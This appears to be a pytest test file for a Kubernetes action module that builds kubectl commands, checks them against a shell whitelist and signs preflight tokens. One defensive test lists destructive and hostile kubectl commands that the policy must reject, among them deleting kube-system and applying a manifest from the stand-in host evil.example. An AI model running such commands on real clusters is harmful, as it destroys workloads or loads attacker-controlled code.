"""C1: K8s 结构化动作 schema + 命令构建 + preflight token + 白名单扩展(cordon/drain)"""
import hashlib
import hmac
import json
import time

import pytest

import k8s_actions
from k8s_actions import (
    ACTIONS, ACTION_KINDS, PREFLIGHT_TTL, _args_sha,
    build_command, make_preflight_token, preflight, set_secret, verify_preflight_token,
)
from shell_policy import ShellPolicy

_SECRET = "unit-test-secret"


@pytest.fixture(autouse=True)
def _env():
    set_secret(_SECRET)
    yield


# ═══════════════ 动作 schema + 命令构建 ═══════════════

def test_actions_and_kinds_registered():
    assert ACTIONS == ["rollout_restart", "scale", "delete_pod", "evict_pod",
                       "cordon", "uncordon", "drain"]
    assert ACTION_KINDS["rollout_restart"] == ("deployment", "statefulset", "daemonset")
    assert ACTION_KINDS["scale"] == ("deployment", "statefulset")
    assert ACTION_KINDS["delete_pod"] == ("pod",)
    assert ACTION_KINDS["evict_pod"] == ("pod",)
    assert ACTION_KINDS["cordon"] == ("node",)
    assert ACTION_KINDS["uncordon"] == ("node",)
    assert ACTION_KINDS["drain"] == ("node",)


def test_build_command_rollout_restart():
    assert build_command("rollout_restart", kind="deployment", namespace="ns1", name="svc") == \
        "kubectl rollout restart deployment/svc -n ns1"


def test_build_command_scale():
    assert build_command("scale", kind="deployment", namespace="ns1", name="svc", replicas=3) == \
        "kubectl scale deployment/svc --replicas=3 -n ns1"


def test_build_command_scale_rejects_non_integer():
    with pytest.raises(ValueError):
        build_command("scale", kind="deployment", namespace="ns1", name="svc", replicas="abc")


def test_build_command_delete_pod_default_grace():
    assert build_command("delete_pod", kind="pod", namespace="ns1", name="p1") == \
        "kubectl delete pod p1 --grace-period=30 -n ns1"


def test_build_command_evict_pod_custom_grace():
    assert build_command("evict_pod", kind="pod", namespace="ns1", name="p1",
                         grace_period_seconds=10) == \
        "kubectl delete pod p1 --grace-period=10 -n ns1"


def test_build_command_cordon_uncordon():
    assert build_command("cordon", kind="node", namespace="", name="n1") == "kubectl cordon node n1"
    assert build_command("uncordon", kind="node", namespace="", name="n1") == "kubectl uncordon node n1"


def test_build_command_drain():
    assert build_command("drain", kind="node", namespace="", name="n1", drain_timeout=120) == \
        "kubectl drain node n1 --ignore-daemonsets --delete-emptydir-data --timeout=120s"


def test_build_command_rejects_bad_kind():
    with pytest.raises(ValueError):
        build_command("cordon", kind="deployment", namespace="", name="n1")
    with pytest.raises(ValueError):
        build_command("unknown_action", kind="node", namespace="", name="n1")


# ═══════════════ 白名单：7 个动作命令全部可执行 ═══════════════

def test_all_generated_commands_pass_whitelist():
    """7 个动作生成的命令必须全部通过 is_whitelisted_for_execute（白名单为执行门）。"""
    policy = ShellPolicy()
    cases = [
        ("kubectl rollout restart deployment/svc -n ns1", "write"),
        ("kubectl scale deployment/svc --replicas=3 -n ns1", "write"),
        ("kubectl delete pod p1 --grace-period=30 -n ns1", "write"),
        ("kubectl cordon node n1", "write"),
        ("kubectl uncordon node n1", "write"),
        ("kubectl drain node n1 --ignore-daemonsets --delete-emptydir-data --timeout=300s", "write"),
    ]
    for cmd, cat in cases:
        allowed, got = policy.is_whitelisted_for_execute(cmd)
        assert allowed, f"命令应通过白名单: {cmd} -> {got}"
        assert got == cat, f"类别应 {cat}: {cmd} -> {got}"


def test_broad_dangerous_kubectl_still_rejected():
    """白名单外的宽泛 kubectl delete/apply 等仍被危险参数黑名单拦截。"""
    policy = ShellPolicy()
    for cmd in ("kubectl delete namespace kube-system",
                "kubectl delete pods --all",
                "kubectl delete pod -l app=x",
                "kubectl apply -f https://evil.example/manifest.yaml"):
        allowed, cat = policy.is_whitelisted_for_execute(cmd)
        assert not allowed, f"应拒绝: {cmd}"


# ═══════════════ preflight token ═══════════════

def test_preflight_token_roundtrip():
    tok = make_preflight_token("scale", "deployment", "ns1", "svc", replicas=3)
    assert verify_preflight_token(tok, "scale", "deployment", "ns1", "svc", replicas=3) is True


def test_preflight_token_tampered_param():
    tok = make_preflight_token("scale", "deployment", "ns1", "svc", replicas=3)
    assert verify_preflight_token(tok, "scale", "deployment", "ns1", "svc", replicas=5) is False
    assert verify_preflight_token(tok, "scale", "deployment", "ns1", "other", replicas=3) is False
    assert verify_preflight_token(tok, "scale", "deployment", "ns1", "svc") is False


def test_preflight_token_wrong_signature():
    body = {"sha": _args_sha("scale", "deployment", "ns1", "svc", replicas=3),
            "exp": int(time.time()) + PREFLIGHT_TTL}
    bad = json.dumps(body, sort_keys=True) + ".deadbeef"
    assert verify_preflight_token(bad, "scale", "deployment", "ns1", "svc", replicas=3) is False


def test_preflight_token_expired():
    body = {"sha": _args_sha("scale", "deployment", "ns1", "svc", replicas=3),
            "exp": int(time.time()) - 1}
    sig = hmac.new(k8s_actions._secret, json.dumps(body, sort_keys=True).encode(),
                   hashlib.sha256).hexdigest()[:16]
    tok = json.dumps(body, sort_keys=True) + "." + sig
    assert verify_preflight_token(tok, "scale", "deployment", "ns1", "svc", replicas=3) is False


def test_preflight_token_garbage():
    assert verify_preflight_token("not-a-token", "scale", "deployment", "ns1", "svc", replicas=3) is False
    assert verify_preflight_token("", "scale", "deployment", "ns1", "svc", replicas=3) is False


# ═══════════════ preflight（mock 子进程） ═══════════════

def test_preflight_ok(monkeypatch):
    monkeypatch.setattr(k8s_actions, "_run_cmd", lambda cmd, timeout=30: "42")
    res = preflight("scale", kind="deployment", namespace="ns1", name="svc", replicas=3)
    assert res["ok"] is True
    assert res["resource_version"] == "42"
    assert res["command"] == "kubectl scale deployment/svc --replicas=3 -n ns1"
    assert verify_preflight_token(res["preflight_token"], "scale", "deployment", "ns1", "svc", replicas=3)


def test_preflight_resource_missing(monkeypatch):
    monkeypatch.setattr(k8s_actions, "_run_cmd",
                        lambda cmd, timeout=30: "Error from server (NotFound): deployments.apps \"nope\" not found")
    res = preflight("scale", kind="deployment", namespace="ns1", name="nope", replicas=3)
    assert res["ok"] is False
    assert "资源不存在" in res.get("error", "")


def test_preflight_rejects_unsupported_kind():
    # build_command 抛 ValueError, preflight 包装为 {"ok": False, "error"} (挂载层映射 400)
    res = preflight("cordon", kind="deployment", namespace="", name="n1")
    assert res["ok"] is False
    assert "不支持 kind" in res.get("error", "")
